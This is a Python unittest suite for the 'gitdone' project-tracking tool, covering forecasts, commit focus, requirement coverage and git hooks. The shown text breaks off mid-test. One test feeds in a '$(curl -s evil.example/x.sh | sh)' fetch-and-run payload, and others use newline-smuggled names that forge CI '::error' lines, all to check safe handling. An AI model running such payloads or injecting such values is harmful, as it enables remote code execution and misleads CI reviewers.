"""Each test here is a defect someone reproduced in `eta`, `focus` or `matrix`: an independent attack and a cold read, against the first cut of this layer."""
import contextlib
import datetime
import io
import json
import os
import pathlib
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
import unittest.mock

from helpers import ENGINE, clean_env, delete_tree, git, needs_sh, not_on_windows

from gitdone import chart, ci, cli, evidence, focus, forecast, gate, gitio, history, portfolio, requirements, table as tables, trace
from gitdone.plan import Plan, PlanError

TODAY = datetime.date(2026, 3, 1)


def table_text(rows):
    lines = ["# Project", "", f"### 1. All ({len(rows)})", "", "| # | Capability | Status | Note |", "|---|---|---|---|"]
    for num, (name, kind) in sorted(rows.items()):
        lines.append(f"| {num} | {name} | {kind} | {'started' if kind == 'Partial' else ''} |")
    return "\n".join(lines) + "\n"


class Case(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.tmp = pathlib.Path(self._tmp.name).resolve()
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        git(self.repo, "init", "-q", "-b", "main")
        self.rows = {n: (f"Thing {n}", "Not built") for n in range(1, 11)}
        self.plan_path = self.repo / ".gitdone.json"
        self.write_plan()

    def write_plan(self, **keys):
        self.plan_path.write_text(json.dumps({"status_doc": "status-table.md", "repo": ".", "default_branch": "main", **keys}))

    def plan(self):
        return Plan(self.plan_path)

    def write_table(self):
        (self.repo / "status-table.md").write_text(table_text(self.rows))

    def commit(self, day, message="change", committer=None, files=None, table=True, where=None):
        where = where or self.repo
        if table:
            self.write_table()
        for name, text in (files or {}).items():
            path = where / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text)
        git(where, "add", "-A")
        git(where, "commit", "-q", "--allow-empty", "-m", message,
            env={"GIT_AUTHOR_DATE": f"{day}T12:00:00", "GIT_COMMITTER_DATE": f"{committer or day}T12:00:00"})
        return git(where, "rev-parse", "HEAD")

    def move(self, num, kind, day, **keys):
        self.rows[num] = (self.rows[num][0], kind)
        return self.commit(day, **keys)

    def steady(self):
        self.commit("2026-01-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.move(i, "Partial", day)

    def data(self, **kwargs):
        return forecast.data(self.plan(), today=TODAY, **kwargs)

    def engine(self, *args, cwd=None, env=None):
        return subprocess.run(["python3", str(ENGINE), *args], cwd=str(cwd or self.repo), env={**clean_env(), **(env or {})}, capture_output=True, text=True, stdin=subprocess.DEVNULL)


class TheDatesInTheHistory(Case):
    def test_t3_an_old_committer_date_near_the_tip_hides_nothing(self):
        self.steady()
        before = self.data()
        (self.repo / "y.txt").write_text("x\n")
        self.commit("2026-02-25", "landed from an old branch", committer="2015-01-01")
        after = self.data()
        self.assertEqual(after["moving_days"], before["moving_days"])
        self.assertEqual(after["state"], "dated")

    def test_t3_focus_is_not_hidden_by_one_either(self):
        self.steady()
        for i in range(3):
            self.commit(f"2026-02-2{i + 1}", f"row 1: work {i}", files={f"w{i}.py": "1\n"}, table=False)
        self.commit("2026-02-25", "row 1: an old committer", committer="2015-01-01", files={"z.py": "1\n"}, table=False)
        self.assertEqual(focus.data(self.plan(), today=TODAY)["on_plan"], 4)

    def test_t4_a_rebase_of_old_work_moves_nothing(self):
        self.commit("2025-12-01", "first")
        for i, day in enumerate(("2025-12-10", "2025-12-20", "2026-01-05", "2026-01-15", "2026-01-25", "2026-02-05", "2026-02-10", "2026-02-20"), start=1):
            self.move(i, "Partial", day)
        before = self.data()
        git(self.repo, "rebase", "-q", "--root", "--force-rebase", env={"GIT_COMMITTER_DATE": "2026-02-28T12:00:00"})
        after = self.data()
        self.assertEqual((after["likely"], after["moving_days"]), (before["likely"], before["moving_days"]))

    def test_t14_one_future_author_date_is_not_carried_forward(self):
        self.commit("2026-01-01", "first")
        self.rows[1] = ("Thing 1", "Partial")
        self.commit("2031-01-01", "m1", committer="2026-02-03")
        for i, day in zip((2, 3, 4), ("2026-02-08", "2026-02-15", "2026-02-22")):
            self.move(i, "Partial", day)
        self.assertEqual(self.data()["moving_days"], 4)

    def test_t14_a_chart_stays_on_its_canvas(self):
        self.commit("2026-01-01", "first")
        self.rows[1] = ("Thing 1", "Partial")
        self.commit("2031-01-01", "m1", committer="2031-01-01")
        items = chart.points(self.plan(), today=TODAY.isoformat())
        self.assertLessEqual(items[-1]["date"], TODAY.isoformat())

    def test_t40_a_huge_window_is_the_tables_life(self):
        self.steady()
        found = self.data(days=30000)
        self.assertEqual(found["window_days"], (TODAY - datetime.date(2026, 1, 1)).days)  # from the day after its first, which says where the project stood

    def test_t33_the_words_say_within_what(self):
        self.commit("2025-01-01", "first")
        for i, day in enumerate(("2025-02-01", "2025-02-02", "2025-02-03", "2025-02-04"), start=1):
            self.move(i, "Partial", day)
        self.move(5, "Partial", "2026-02-20")
        self.assertIn("rows moved on 1 of the last 28 days", forecast.headline(self.data()))


class TheTablesHistory(Case):
    def test_t13_a_rename_does_not_look_like_a_birth(self):
        self.commit("2025-01-01", "first")
        for i, day in enumerate(("2025-02-01", "2025-03-01"), start=1):
            self.move(i, "Partial", day)
        (self.repo / "docs").mkdir()
        git(self.repo, "mv", "status-table.md", "docs/status-table.md")
        self.write_plan(status_doc="docs/status-table.md")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "move the table", env={"GIT_AUTHOR_DATE": "2026-02-18T12:00:00", "GIT_COMMITTER_DATE": "2026-02-18T12:00:00"})
        self.assertEqual(self.data()["window_days"], 28)

    def test_t11_a_tracker_beside_another_does_not_inherit_its_life(self):
        one, two = self.repo / "a", self.repo / "b"
        one.mkdir()
        two.mkdir()
        self.plan_path.unlink()
        text = json.dumps({"status_doc": "status-table.md", "repo": ".", "default_branch": "main"})
        (one / ".gitdone.json").write_text(text)
        (one / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-01-01", "a begins", table=False)
        for i, day in enumerate(("2026-02-05", "2026-02-10"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            (one / "status-table.md").write_text(table_text(self.rows))
            self.commit(day, f"a moves {i}", table=False)
        shutil.copy(one / "status-table.md", two / "status-table.md")
        (two / ".gitdone.json").write_text(text)
        self.commit("2026-02-28", "b begins, from a's table", table=False)
        found = forecast.data(Plan(two / ".gitdone.json"), today=TODAY)
        self.assertEqual(found["window_days"], 1)
        self.assertEqual(found["scope"]["added"], 0)
        self.assertEqual(chart.points(Plan(two / ".gitdone.json"), today=TODAY.isoformat())[0]["date"], "2026-02-28")

    def test_t15_a_table_that_did_not_parse_says_nothing_about_any_row(self):
        self.commit("2026-01-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.move(i, "Partial", day)
        (self.repo / "status-table.md").write_text(table_text(self.rows).replace("### 1. All (10)", "### Core"))
        self.commit("2026-02-20", "oops", table=False)
        self.move(4, "Partial", "2026-02-21")
        found = self.data()
        self.assertEqual((found["scope"]["added"], found["scope"]["removed"]), (0, 0))
        self.assertEqual(found["moving_days"], 4)

    def test_t21_a_table_with_windows_line_ends_keeps_its_rows(self):
        def write():
            text = "```\nexample\n```\n\n" + table_text(self.rows)
            (self.repo / "status-table.md").write_bytes(text.replace("\n", "\r\n").encode())
        write()
        self.commit("2026-01-01", "first", table=False)
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            write()
            self.commit(day, f"m{i}", table=False)
        self.assertEqual(self.data()["moving_days"], 3)
        self.assertEqual(chart.points(self.plan(), today=TODAY.isoformat())[-1]["scope"], 10)

    def test_t42_a_quote_in_the_tables_name(self):
        not_on_windows(self, "Windows allows no quote in a file's name")
        name = 'my "table".md'
        self.write_plan(status_doc=name)
        (self.repo / name).write_text(table_text(self.rows))
        self.commit("2026-01-01", "first", table=False)
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            (self.repo / name).write_text(table_text(self.rows))
            self.commit(day, f"m{i}", table=False)
        self.assertEqual(self.data()["moving_days"], 3)

    def test_t17_a_shallow_clone_says_so_rather_than_a_date(self):
        self.steady()
        clone = self.tmp / "clone"
        git(self.tmp, "clone", "-q", "--depth", "2", f"file://{self.repo}", str(clone))
        found = forecast.data(Plan(clone / ".gitdone.json"), today=TODAY)
        self.assertEqual(found["state"], "shallow")
        self.assertIsNone(found["likely"])
        self.assertIn("shallow", forecast.headline(found))

    def test_t20_a_history_git_cannot_read_is_an_error_and_not_a_shorter_history(self):
        self.steady()
        tree = git(self.repo, "rev-parse", "HEAD~2^{tree}")
        (self.repo / ".git" / "objects" / tree[:2] / tree[2:]).chmod(0o644)
        (self.repo / ".git" / "objects" / tree[:2] / tree[2:]).unlink()
        with self.assertRaises(PlanError):
            self.data()

    def test_a_repository_with_no_commit_is_no_error(self):
        self.write_table()
        self.assertEqual(self.data()["state"], "too_little")


class TheWords(Case):
    def test_t16_rows_that_moved_and_went_back_are_not_nothing_moving(self):
        self.commit("2026-01-01", "first")
        for day, kind in (("2026-02-05", "Partial"), ("2026-02-10", "Not built"), ("2026-02-15", "Partial"), ("2026-02-20", "Not built")):
            self.move(1, kind, day)
        words = forecast.headline(self.data())
        self.assertIn("went back as far as they came", words)
        self.assertNotIn("nothing moved", words)

    def test_t26_an_85_percent_date_past_ten_years_is_not_given_as_ten_years(self):
        dates = forecast._dates(39.6, [0.0] * 8 + [3.0] + [0.0] * 4 + [-3.0] + [0.0] * 9 + [0.4] + [0.0] * 4, TODAY)
        self.assertIsNotNone(dates["likely"])
        self.assertIsNone(dates["sure"])

    def test_t26_the_table_says_so(self):
        self.steady()
        found = {**self.data(), "sure": None}
        self.assertIn("past ten years", forecast.text(found))

    def test_t34_a_small_need_is_not_zero(self):
        self.assertEqual(forecast._pace_words(0.002), "under 0.01")

    def test_t35_nothing_left_by_the_weights_is_not_every_row_done(self):
        self.rows = {1: ("A", "Merged"), 2: ("B", "Merged")}
        self.write_plan(kinds=[{"name": "Live", "weight": 1.0, "evidence": "release"}, {"name": "Merged", "weight": 1.0}, {"name": "Todo", "weight": 0.0}])
        self.commit("2026-01-01", "first")
        words = forecast.headline(self.data())
        self.assertIn("by the plan's weights", words)
        self.assertNotIn("every row is done", words)

    def test_t37_a_start_after_the_deadline_is_said_and_left_out(self):
        self.write_plan(deadline="2026-03-05", start="2026-04-01")
        plan = self.plan()
        self.assertIsNone(plan.start)
        self.assertIn("after the deadline", plan.signal_problems[0])

    def test_the_date_says_what_it_rests_on_when_scope_keeps_growing(self):
        self.steady()
        for n, day in zip((11, 12), ("2026-02-16", "2026-02-21")):
            self.rows[n] = (f"Thing {n}", "Not built")
            self.commit(day)
        found = self.data()
        self.assertIn("if the scope stops growing", forecast.headline(found))
        self.assertIn("rows a day against", forecast.text(found))
        self.assertNotIn("if_it_goes_on", found["scope"])  # a date through two rates swung by months with every row added

    def test_a_group_can_be_asked_for_as_the_opener_calls_it(self):
        self.steady()
        done = self.engine("eta", "--group", "All", "--json")
        self.assertEqual(done.returncode, 0, done.stderr)

    def test_the_burndown_as_csv_is_csv(self):
        self.steady()
        done = self.engine("chart", "--burndown", "--csv")
        self.assertTrue(done.stdout.startswith("date,scope,left_all_work,left_strict"), done.stdout[:80])


class TheLiveLine(Case):
    def test_a_burst_of_partial_rows_cannot_pass_for_progress(self):
        """One commit marks seven rows Partial with a word each. The weighted date jumps, and the line through Live rows does not move."""
        self.commit("2026-01-01", "first")
        for i, day in zip(range(1, 4), ("2026-02-05", "2026-02-10", "2026-02-15")):
            self.rows[i] = (f"Thing {i}", "Partial")
            self.commit(day)
        found = self.data()
        self.assertEqual(found["live"]["left"], 10)
        self.assertEqual(found["live"]["moving_days"], 0)
        self.assertIsNone(found["live"]["likely"])
        words = forecast.text(found)
        self.assertIn("Live alone  no date: they moved on 0 of the last 28 days", words)
        self.assertIn("with all work, and Live rows alone give no date yet", forecast.headline(found))

    def test_rows_reaching_live_get_their_own_date(self):
        repo_commit = self.commit("2026-01-01", "first")
        for i, day in zip(range(1, 5), ("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20")):
            self.rows[i] = (f"Thing {i}", "Live")
            self.commit(day)
        self.assertTrue(repo_commit)
        found = self.data()
        self.assertEqual(found["live"]["left"], 6)
        self.assertEqual(found["live"]["moving_days"], 4)
        self.assertIsNotNone(found["live"]["likely"])

    def test_a_deadline_says_both_when_they_disagree(self):
        self.write_plan(deadline="2026-12-01")
        self.commit("2026-01-01", "first")
        for i, day in zip(range(1, 4), ("2026-02-05", "2026-02-10", "2026-02-15")):
            self.rows[i] = (f"Thing {i}", "Live")
            self.commit(day)
        for i, day in zip(range(4, 11), ("2026-02-16", "2026-02-17", "2026-02-18", "2026-02-19", "2026-02-20", "2026-02-21", "2026-02-22")):
            self.rows[i] = (f"Thing {i}", "Partial")
            self.commit(day)
        self.assertIn("on Live rows alone,", forecast.text(self.data()))


class Requirements(Case):
    def spec(self, text, name="spec.md"):
        (self.repo / name).write_text(text)
        self.write_plan(requirements=[name])

    def coverage(self):
        plan = self.plan()
        return requirements.coverage(plan, tables.load_clean(plan))

    def test_t1_a_long_run_of_spaces_costs_nothing(self):
        self.write_table()
        self.spec("- [ ] a" + " " * 300000 + "b\n- REQ-1: fine\n")
        began = time.monotonic()
        found = self.coverage()
        self.assertLess(time.monotonic() - began, 10.0)
        self.assertEqual([i.ident for i, _ in found["items"]], ["REQ-1"])

    def test_t1_the_checklist_reader_is_as_quick(self):
        from gitdone import scaffold
        began = time.monotonic()
        scaffold.CHECK_ITEM.match("- [ ] a" + " " * 200000 + "b")
        self.assertLess(time.monotonic() - began, 5.0)

    def test_t2_the_suggestion_cannot_run_anything_if_pasted(self):
        self.write_table()
        self.spec("- REQ-1: $(curl -s evil.example/x.sh | sh)\n")
        item = self.coverage()["without"][0]
        words = requirements.what_to_do(item)
        command = words.split(", or if a row holds it")[0]
        self.assertEqual(shlex.split(command)[:2], ["gitdone", "add"])
        self.assertEqual(len(shlex.split(command)), 3)  # one quoted argument, in which nothing is expanded
        self.assertTrue(command.split(" ", 2)[2].startswith("'"))

    def test_t7_a_name_no_system_can_open_is_a_note_and_stops_nothing(self):
        for name in ("a\u0000b.md", "~nosuchuser_x/spec.md", "\ud800.md"):
            with self.subTest(repr(name)):
                self.write_table()
                self.plan_path.write_text(json.dumps({"status_doc": "status-table.md", "repo": ".", "requirements": [name]}))
                plan = self.plan()
                found = requirements.coverage(plan, tables.load_clean(plan))
                self.assertTrue(found["problems"])

    def test_t18_nested_items_count_and_wrapped_prose_does_not(self):
        items = requirements.parse("- REQ-1: a list item\n    - REQ-2: nested four spaces\n- [ ] top\n    - [ ] nested item\n\nEverything we keep is hashed with\nSHA-256 and stored as\nUTF-8 text.\n", "s.md")
        self.assertEqual([i.ident or i.words for i in items], ["REQ-1", "REQ-2", "top", "nested item"])

    def test_t18_a_standard_with_a_separator_is_still_a_standard(self):
        self.assertEqual(requirements.parse("UTF-8: everything\nREQ-1: real\n", "s.md")[0].ident, "REQ-1")

    def test_t18_a_fence_left_open_is_said(self):
        problems = []
        requirements.parse("- REQ-1: read\n\n~~~\n- REQ-2: not read\n", "s.md", problems)
        self.assertIn("never closes", problems[0])

    def test_t41_a_long_spec_against_a_long_table_is_quick(self):
        self.rows = {n: (f"Thing {n} of many", "Not built") for n in range(1, 5001)}
        self.write_table()
        self.spec("".join(f"REQ-{i}: thing {i}\n" for i in range(1, 5001)))
        began = time.monotonic()
        self.coverage()
        self.assertLess(time.monotonic() - began, 15.0)

    def test_a_heading_with_an_id_is_a_requirement_on_a_fresh_start(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("# Spec\n\n### REQ-3: Export to PDF\n\n- REQ-4: Export to CSV\n")
        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
        plan = self.plan()
        table = tables.load_clean(plan)
        self.assertEqual(sorted(r.name for r in table.rows.values()), ["Export to CSV", "Export to PDF"])
        self.assertEqual(requirements.coverage(plan, table)["without"], [])

    def test_a_living_to_do_list_is_not_named_as_requirements(self):
        """Every ordinary task added to it would read as a gap."""
        self.plan_path.unlink()
        (self.repo / "TODO.md").write_text("- [ ] One\n- [ ] Two\n")
        self.assertEqual(self.engine("init", "--from-checklist", "TODO.md").returncode, 0)
        self.assertEqual(self.plan().requirements, [])

    def test_an_id_with_the_same_words_as_a_row_finds_it(self):
        """The cold reader's first hour: a spec and a table with the same words read 0 of 9, and the advice was to add every row again."""
        self.rows = {1: ("Create an invoice from the command line", "Not built")}
        self.write_table()
        self.spec("- REQ-1: Create an invoice from the command line\n")
        self.assertEqual(self.coverage()["without"], [])

    def test_an_id_in_a_row_still_wins_over_words(self):
        self.rows = {1: ("Create an invoice from the command line", "Not built"), 2: ("Something else", "Not built")}
        (self.repo / "status-table.md").write_text(table_text(self.rows).replace("| 2 | Something else | Not built |  |", "| 2 | Something else | Not built | REQ-1 |"))
        self.spec("- REQ-1: Create an invoice from the command line\n")
        self.assertEqual([r.num for r in self.coverage()["items"][0][1]], [2])

    def test_export_to_pdf_is_not_export_to_csv(self):
        self.rows = {1: ("Export invoice to PDF", "Not built")}
        self.write_table()
        self.spec("- [ ] Export invoice to CSV\n")
        self.assertEqual(len(self.coverage()["without"]), 1)

    def test_init_from_a_spec_keeps_the_spec_as_what_the_rows_answer_to(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("# Spec\n\n- REQ-1: Sign in\n- REQ-2: Search\n")
        done = self.engine("init", "--from-checklist", "spec.md")
        self.assertEqual(done.returncode, 0, done.stderr)
        plan = self.plan()
        self.assertEqual(plan.requirements, ["spec.md"])
        table = tables.load_clean(plan)
        self.assertEqual(sorted(r.name for r in table.rows.values()), ["Search", "Sign in"])
        self.assertEqual(requirements.coverage(plan, table)["without"], [])

    def test_a_checklist_outside_the_project_is_not_named(self):
        self.plan_path.unlink()
        outside = self.tmp / "todo.md"
        outside.write_text("- [ ] One\n")
        done = self.engine("init", "--from-checklist", str(outside))
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertEqual(self.plan().requirements, [])


class Newlines(Case):
    def test_t5_a_requirement_file_name_cannot_start_a_line(self):
        self.write_table()
        (self.repo / "spec.md").write_text("- REQ-1: words\n")
        self.write_plan(requirements=["x\n::error title=gitdone::the gate failed\n/../spec.md"])
        lines = gate.report(self.plan(), offline=True).lines()
        for line in lines:
            self.assertFalse(line.startswith("::"), line)

    def test_t5_a_folder_with_a_newline_cannot_start_a_line(self):
        needs_sh(self)
        self.commit("2026-01-01", "first")
        name = "a\nresult: PASS\n::error::from a file name/x.py"
        self.commit("2026-02-25", "Odd work", files={name: "1\n"}, table=False)
        words = focus.text(focus.data(self.plan(), today=TODAY))
        for line in words.split("\n"):
            self.assertFalse(line.startswith(("::", "result:")), line)

    def test_t5_a_workstream_name_cannot_start_a_line(self):
        self.write_plan(workstreams=[{"id": "P1", "name": "x\n::error::forged", "rows": "1-2"}], order=["P1"])
        self.steady()
        for words in (forecast.text(self.data()), focus.next_text(focus.next_data(self.plan())), focus.text(focus.data(self.plan(), today=TODAY))):
            for line in words.split("\n"):
                self.assertFalse(line.startswith("::"), line)


class TheFocusCommits(Case):
    def judged(self, message, files, day="2026-02-25"):
        sha = self.commit(day, message, files=files, table=False)
        return {c["commit"]: c for c in focus.data(self.plan(), today=TODAY)["list"]}[sha[:7]]

    def setUp(self):
        super().setUp()
        self.commit("2026-01-01", "first")

    def test_t6_a_pattern_a_python_cannot_read_matches_nothing(self):
        self.write_plan(focus={"upkeep": ["[z-a]"]})
        self.assertEqual(self.judged("Work", {"x.py": "1\n"})["class"], focus.OFF)

    def test_t19_a_few_bytes_cannot_ask_for_much(self):
        self.write_plan(focus={"paths": {f"{i}-{i + 99999}": ["x/"] for i in range(1, 121)}})
        plan = self.plan()
        self.assertIn("names more than", plan.signal_problems[0])
        self.assertLessEqual(len(plan.focus["paths"]), 2)

    def test_t25_a_message_with_the_old_separators_is_read_whole(self):
        path = self.repo / "a.py"
        path.write_text("1\n")
        git(self.repo, "add", "-A")
        stamp = "2026-02-25T12:00:00"
        subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "commit", "-q", "-F", "-"],
                       input=b"ship something big\x01\x02\n", env={**clean_env(), "GIT_AUTHOR_DATE": stamp, "GIT_COMMITTER_DATE": stamp}, check=True)
        found = focus.data(self.plan(), today=TODAY)
        self.assertEqual(found["off_plan"], 1)
        self.assertEqual(found["list"][0]["class"], focus.OFF)

    def test_t29_a_range_reads_the_whole_of_the_tables_history(self):
        base = git(self.repo, "rev-parse", "HEAD")
        self.rows[1] = ("Thing 1", "Partial")
        self.commit("2025-06-01", "Wire it up", files={"zz.py": "1\n"})
        found = focus.data(self.plan(), today=TODAY, revisions=f"{base}..HEAD")
        self.assertEqual(found["on_plan"], 1)

    def test_t31_a_branch_row_3_2fa_login_names_row_3(self):
        self.assertEqual(focus.named_rows("Merge branch 'row-3-2fa-login'", {1, 2, 3}), {3})

    def test_t31_a_range_needs_the_plural(self):
        self.assertEqual(focus.named_rows("rows 1-3", {1, 2, 3, 4}), {1, 2, 3})
        self.assertEqual(focus.named_rows("row 3-1", {1, 2, 3}), {3})
        self.assertEqual(focus.named_rows("rows 3-1", {1, 2, 3}), {1, 2, 3})

    def test_t32_the_plans_paths_for_a_row_finished_long_ago_are_polish(self):
        self.rows[1] = ("Thing 1", "Live")
        (self.repo / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-01-02", "row 1 went live", table=False)
        self.write_plan(focus={"paths": {"1": ["src/"]}})
        self.assertEqual(self.judged("Polish the driver", {"src/d.py": "1\n"})["class"], focus.OFF)

    def test_a_revert_advances_nothing_even_with_a_rows_words(self):
        self.rows[1] = ("Export invoice", "Not built")
        self.write_table()
        self.commit("2026-02-20", "scope", table=False)
        self.assertEqual(self.judged('Revert "Export invoice to PDF"', {"src/e.py": "1\n"})["class"], focus.UPKEEP)

    def test_a_revert_of_a_commit_that_named_a_row_is_not_on_plan(self):
        self.assertEqual(self.judged('Revert "row 1: the thing"', {"src/e.py": "1\n"})["class"], focus.UPKEEP)

    def test_a_large_change_is_not_upkeep_for_saying_so(self):
        big = "".join(f"line {i}\n" for i in range(focus.UPKEEP_SUBJECT_LINES + 1))
        judged = self.judged("chore: rewrite the whole plugin system", {"src/plugins.py": big})
        self.assertEqual(judged["class"], focus.UNCLEAR)
        self.assertIn("says upkeep", judged["because"])

    def test_docs_in_a_subject_does_not_excuse_source(self):
        self.assertEqual(self.judged("docs: rewrite the plugin system", {"src/plugins.py": "1\n"})["class"], focus.OFF)

    def test_a_small_chore_still_is(self):
        self.assertEqual(self.judged("chore: tidy", {"src/plugins.py": "1\n"})["class"], focus.UPKEEP)

    def test_a_row_the_table_does_not_have_is_said(self):
        self.assertIn("row 99, which the table does not have", self.judged("Polish, row 99", {"a.py": "1\n"})["because"])

    def test_a_workstream_starting_the_subject_ties_it(self):
        self.write_plan(workstreams=[{"id": "P2", "name": "Launch", "rows": "3-4"}], order=["P2"])
        judged = self.judged("P2: reminder sender", {"a.py": "1\n"})
        self.assertEqual(judged["rows"], [3, 4])
        self.assertIn("workstream", judged["because"])

    def test_the_same_letters_elsewhere_in_a_subject_do_not(self):
        self.write_plan(workstreams=[{"id": "S3", "name": "Launch", "rows": "3-4"}], order=["S3"])
        self.assertEqual(self.judged("Move uploads to S3", {"a.py": "1\n"})["class"], focus.OFF)

    def test_commits_older_than_the_table_are_not_judged(self):
        fresh = self.tmp / "fresh"
        fresh.mkdir()
        git(fresh, "init", "-q", "-b", "main")
        self.commit("2026-02-20", "Add a login form", files={"login.py": "1\n"}, table=False, where=fresh)
        self.commit("2026-02-21", "Add a parser", files={"parser.py": "1\n"}, table=False, where=fresh)
        (fresh / ".gitdone.json").write_text(self.plan_path.read_text())
        (fresh / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-02-22", "Start the tracker", table=False, where=fresh)
        self.assertEqual(focus.data(Plan(fresh / ".gitdone.json"), today=TODAY)["commits"], 0)
        self.commit("2026-02-23", "Work on something", files={"more.py": "1\n"}, table=False, where=fresh)
        self.assertEqual(focus.data(Plan(fresh / ".gitdone.json"), today=TODAY)["commits"], 1)

    def test_a_branch_named_for_a_row_is_unclear_until_someone_says_so(self):
        git(self.repo, "checkout", "-q", "-b", "row-5-payments")
        judged = self.judged("Add a charge", {"pay.py": "1\n"})
        self.assertEqual(judged["class"], focus.UNCLEAR)
        self.assertEqual(judged["rows"], [5])
        self.assertIn("branch", judged["because"])

    def test_a_row_that_had_finished_does_not_make_new_work_on_plan(self):
        self.rows[1] = ("Thing 1", "Live")
        self.write_table()
        self.commit("2026-01-02", "row 1 went live", table=False)
        judged = self.judged("row 1: rewrite the theme", {"t.py": "1\n"})
        self.assertEqual(judged["class"], focus.UNCLEAR)
        self.assertIn("had finished by then", judged["because"])

    def test_lines_are_in_the_numbers_and_the_list(self):
        self.judged("Rewrite the logger", {"s.py": "1\n2\n3\n"})
        words = focus.text(focus.data(self.plan(), today=TODAY))
        self.assertIn("3 lines", words)
        self.assertRegex(words, r"Off plan\s+1\s+100%\s+3 lines\s+100%")

    def test_the_areas_go_by_lines(self):
        self.judged("Small", {"small/a.py": "1\n"})
        self.judged("Large", {"large/a.py": "1\n2\n3\n4\n"})
        self.assertEqual(focus.data(self.plan(), today=TODAY)["areas"][0], {"area": "large", "lines": 4})

    def test_large_upkeep_is_listed(self):
        big = "".join(f"{i}\n" for i in range(focus.LARGE_UPKEEP_LINES + 1))
        self.judged("Add a test harness", {"tests/test_harness.py": big})
        self.assertIn("Large upkeep:", focus.text(focus.data(self.plan(), today=TODAY)))

    def test_a_shallow_clone_says_so(self):
        for i in range(3):
            self.commit(f"2026-02-2{i}", f"row 1: {i}", files={f"f{i}.py": "1\n"}, table=False)
        clone = self.tmp / "clone"
        git(self.tmp, "clone", "-q", "--depth", "1", f"file://{self.repo}", str(clone))
        self.assertIn("shallow", focus.text(focus.data(Plan(clone / ".gitdone.json"), today=TODAY)))


class TheHook(Case):
    def setUp(self):
        super().setUp()
        needs_sh(self)

    def real_commit(self, message, name, where=None):
        where = where or self.repo
        path = where / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(message + "\n")
        git(where, "add", "-A")
        return subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(where), "commit", "-m", message],
                              env=clean_env(), capture_output=True, text=True)

    def installed(self, cwd=None):
        cwd = cwd or self.repo
        self.assertEqual(self.engine("render", "--write", cwd=cwd).returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "the tracker")
        done = self.engine("install-hook", cwd=cwd)
        self.assertEqual(done.returncode, 0, done.stderr)

    def test_t8_with_the_code_elsewhere_a_commit_here_is_not_judged_against_it(self):
        code = self.tmp / "code"
        code.mkdir()
        git(code, "init", "-q", "-b", "main")
        self.commit("2026-02-20", "code: printer driver", files={"printer.py": "1\n"}, table=False, where=code)
        self.write_plan(repo=str(code))
        self.write_table()
        self.installed()
        done = self.real_commit("row 1: notes", "notes.txt")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertNotIn("off plan", done.stdout + done.stderr)

    def test_t9_a_tracker_in_a_subfolder_is_heard(self):
        project = self.repo / "proj"
        project.mkdir()
        self.plan_path.unlink()
        self.plan_path = project / ".gitdone.json"
        self.write_plan()
        (project / "status-table.md").write_text(table_text(self.rows))
        self.installed(cwd=project)
        done = self.real_commit("Wire up the printer", "proj/f.py")
        self.assertIn("is off plan", done.stdout + done.stderr)

    def test_t27_no_focus_takes_out_the_hook_this_engine_wrote(self):
        self.write_table()
        self.installed()
        hook = self.repo / ".git" / "hooks" / "post-commit"
        self.assertTrue(hook.exists())
        self.assertEqual(self.engine("install-hook", "--no-focus").returncode, 0)
        self.assertFalse(hook.exists())

    def test_t28_a_rebase_does_not_repeat_what_was_said(self):
        self.write_table()
        self.installed()
        git(self.repo, "checkout", "-q", "-b", "f")
        for i in range(3):
            self.real_commit(f"Wire up {i}", f"f{i}.py")
        git(self.repo, "checkout", "-q", "main")
        self.real_commit("row 1: x", "m.py")
        git(self.repo, "checkout", "-q", "f")
        done = subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "rebase", "main"],
                              env=clean_env(), capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertNotIn("is off plan", done.stdout + done.stderr)


class Monorepo(Case):
    def setUp(self):
        super().setUp()
        self.plan_path.unlink()
        self.one, self.two = self.repo / "a", self.repo / "b"
        for project in (self.one, self.two):
            project.mkdir()
            (project / ".gitdone.json").write_text(json.dumps({"status_doc": "status-table.md", "repo": ".", "default_branch": "main"}))
            (project / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-01-01", "both begin", table=False)

    def test_t12_a_siblings_commits_are_not_off_this_plan(self):
        for i in range(3):
            self.commit(f"2026-02-2{i}", f"a: work {i}", files={f"a/src/w{i}.py": "1\n"}, table=False)
        self.assertEqual(focus.data(Plan(self.two / ".gitdone.json"), today=TODAY)["commits"], 0)
        self.assertEqual(focus.data(Plan(self.one / ".gitdone.json"), today=TODAY)["commits"], 3)

    def test_t10_a_tracker_in_a_subfolder_finds_its_tests(self):
        self.commit("2026-02-20", "row 1: export", files={"a/tests/test_export.py": "1\n"}, table=False)
        rows = {r["row"]: r for r in trace.rows_data(Plan(self.one / ".gitdone.json"), offline=True)}
